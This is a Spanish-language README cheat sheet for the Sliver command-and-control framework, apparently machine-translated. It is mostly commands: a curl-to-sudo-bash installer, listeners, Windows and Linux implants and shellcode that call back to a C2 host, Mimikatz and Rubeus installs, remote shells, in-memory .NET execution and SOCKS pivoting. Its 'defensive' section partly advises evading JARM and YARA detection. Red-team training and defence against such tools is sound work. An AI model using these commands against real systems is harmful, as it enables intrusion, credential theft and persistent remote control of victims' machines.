<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚔️ Sliver C2 - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
  ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
  ███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██║      █████╔╝
  ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔═══╝ 
  ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
       Modern Open-Source Command & Control (C2) Framework by Bishop Fox
```
<p align="centro">
  <img src="https://img.shields.io/badge/Sliver-C2_Framework-blue?style=for-the-badge" alt="Sliver">
  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="Obispo Fox">
  <img src="https://img.shields.io/badge/Language-Go-cyan?style=for-the-badge" alt="Ir">
  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="Equipo Rojo">
</p>

<p align="centro">
  <b>⚔️ Marco de comando y control y emulación de adversario de código abierto, multiplataforma y moderno compatible con los protocolos mTLS, WireGuard, HTTP(S) y DNS</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y arquitectura] (#-descripción general--arquitectura)
- [Instalación y configuración del servidor](#-instalación--configuración del servidor)
  - [Instalación automatizada de una sola línea](#instalación-automatizada-de-una-línea)
  - [Configuración del operador multijugador](#configuración-del-operador-multijugador)
- [Configuración del oyente (mTLS, HTTP, WireGuard, DNS)](#-listener-configuration-mtls-http-wireguard-dns)
- [Generando Implantes (Beacons vs Sesiones)](#-generando-implantes-beacons-vs-sessions)
  - [Sesiones interactivas frente a balizas asíncronas](#sesiones-interactivas-vs-balizas-asincrónicas)
  - [Implantes de Windows EXE y Shellcode](#windows-exe--shellcode-implants)
  - [Implantes ELF de Linux y macOS](#linux--macos-elf-implants)
- [Ecosistema de Armería y Post-Explotación](#-post-explotación--ecosistema-armería)
  - [Instalación de extensiones de armería (BOF, Donut, cinturón de seguridad)](#instalación-de-extensiones-de-armería-bofs-donut-seatbelt)
  - [Acceso a credenciales y Mimikatz](#acceso-credencial--mimikatz)
  - [SOCKS dinámicos y pivotantes5] (#pivotante--socks dinámicos5)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y detección](#-consideraciones-defensivas--detección)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y arquitectura

Diseñado en Go por **Bishop Fox**, **Sliver** es una de las principales alternativas de código abierto a los marcos comerciales C2 (Cobalt Strike, Brute Ratel):
- **Multiplataforma:** Los servidores y los implantes son compatibles con Windows, Linux y macOS en `x86_64`, `arm64` y `arm`.
- **Comunicación evasiva:** Compatibilidad inmediata con TLS mutuo (mTLS), túneles WireGuard UDP, HTTP/HTTPS con generación de canary procesal y tunelización DNS.
- **Ejecución en memoria:** Inyección de DLL reflectante nativa, archivos de objetos Beacon (BOF), ejecución de .NET en línea a través de Donut y vaciado de procesos.
- **Arquitectura multijugador:** Colaboración en tiempo real entre múltiples operadores del equipo rojo a través de perfiles de operador firmados criptográficamente.

---

## 📥 Instalación y configuración del servidor

### Instalación automatizada de una sola línea
```bash
# Download and install sliver-server and sliver-client
curl -s https://sliver.sh/install | sudo bash

# Start the Sliver background daemon
sudo systemctl enable --now sliver
```
### Configuración del operador multijugador
Cree un perfil de operador en el servidor C2 para un miembro del equipo:
```bash
# On the C2 server
sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliver

# On the operator's laptop
sliver-client import /path/to/alice.sliver
sliver-client
```
---

## 🎧 Configuración del oyente (mTLS, HTTP, WireGuard, DNS)

Dentro de la consola `sliver`:
```text
# Start mutual TLS listener on port 8888
[sliver] > mtls --lport 8888

# Start HTTPS listener on port 443 with automated Let's Encrypt certificates
[sliver] > https --lport 443 --domain c2.example.com

# Start lightweight WireGuard listener on port 53/UDP
[sliver] > wg --lport 53

# Verify running listeners
[sliver] > jobs
```
---

## 🚀 Generando Implantes (Beacons vs Sesiones)

### Sesiones interactivas frente a balizas asincrónicas
- **Sesión:** Conexión TCP/TLS en tiempo real con respuesta de comando instantánea. Mayor visibilidad de la red.
- **Beacon:** Latido asincrónico que duerme durante intervalos con fluctuación aleatoria. Es mucho más difícil para los SOC identificarlos mediante el análisis de anomalías de la red.

### Implantes de Windows EXE y Shellcode
```text
# Generate a Windows x64 interactive mTLS session implant
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe

# Generate a stealthy HTTP beacon implant with 60s sleep and 20% jitter
[sliver] > generate beacon --http https://c2.example.com:443 --seconds 60 --jitter 20 --os windows --format exe

# Generate raw x64 position-independent shellcode
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
```
### Implantes ELF de Linux y macOS
```text
# Linux x64 ELF binary
[sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
```
---

## 🛠️ Ecosistema de armería y posexplotación

### Instalación de extensiones Armory (BOF, Donut, cinturón de seguridad)
Armory es el administrador de paquetes integrado de Sliver para herramientas ofensivas de terceros y archivos de objetos Cobalt Strike Beacon (BOF):
```text
# Update package list
[sliver] > armory update

# Install popular extensions
[sliver] > armory install bof-roast
[sliver] > armory install seatbelt
[sliver] > armory install rubeus
[sliver] > armory install mimikatz
```
### Interactuar con sesiones y balizas
```text
# List active sessions
[sliver] > sessions

# Interact with a specific session
[sliver] > use <SESSION_ID>

# Take a screenshot
[sliver] (session) > screenshot

# Spawn an interactive shell
[sliver] (session) > shell

# Execute .NET assembly in-memory without touching disk
[sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
```
### SOCKS pivotantes y dinámicos5
Enrute herramientas ofensivas externas directamente a la red objetivo comprometida:
```text
# Start SOCKS5 proxy on local port 1080 of the C2 client
[sliver] (session) > socks5 start --port 1080

# Check active pivots
[sliver] > pivots
```
---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando |
|-----------|------------------|
| **Iniciar escucha mTLS** | `mtls --lport 8888` |
| **Iniciar escucha HTTPS** | `https --lport 443 --domain c2.domain.com` |
| **Generar sesión EXE** | `generate --mtls <IP>:8888 --os windows -f exe` |
| **Generar baliza EXE** | `generate beacon --http <URL> --seconds 60 -f exe` |
| **Generar código Shell sin procesar** | `generate --mtls <IP>:8888 -f shellcode` |
| **Listar e interactuar sesiones**| `sessions` -> `use <ID>` |
| **Instalar herramientas de armería** | `armory install seatbelt mimikatz` |
| **Ejecución .NET en memoria**| `execute-assembly /path/to/binary.exe <args>` |
| **SOCKS5 Proxy inverso** | `socks5 start --port 1080` |

---

## 🛡️ Consideraciones defensivas y detección

1. **Huellas dactilares JARM:** Los oyentes HTTP Sliver predeterminados se pueden perfilar utilizando la huella digital JARM TLS activa. Personalice los cifrados TLS en la configuración de Sliver.
2. **YARA y análisis binario:** Los implantes predeterminados producidos por `generate` contienen metadatos de Golang y estructuras de símbolos a menos que se ofusquen mediante confusión (`--skip-symbols`).

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> Sliver es una simulación avanzada de adversarios y un marco de comando y control del equipo rojo. Debe desplegarse exclusivamente en enfrentamientos autorizados con reglas de enfrentamiento (RoE) claras. El uso no autorizado en computadoras de terceros es estrictamente ilegal.